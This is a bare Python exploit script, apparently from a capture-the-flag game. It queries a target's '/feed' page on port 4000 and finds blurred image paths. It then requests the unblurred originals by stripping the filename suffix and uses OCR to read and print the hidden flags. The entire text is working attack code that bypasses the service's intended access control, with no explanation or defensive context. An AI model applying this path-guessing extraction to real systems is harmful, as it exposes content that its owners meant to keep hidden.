import requests
import sys
import tempfile
import subprocess
import os
import re

ip = sys.argv[1]

r = re.compile(r'src="public/static/(\w+)\.png"')

host = f'http://{ip}:4000'
resp = requests.get(host + '/feed')


for path in r.findall(resp.text):
    if "blured" not in path:
        continue
    url = "/public/static/" + path[:-7] + ".png"
    resp = requests.get(host + url)
    if resp.status_code != 200:
        continue
    f= tempfile.NamedTemporaryFile(suffix='.png', delete=False)
    f.write(resp.content)
    f.close()
    flag = subprocess.check_output(["gocr", f.name, "-C", "0-9A-Z="])

    print(flag)
    os.unlink(f.name)





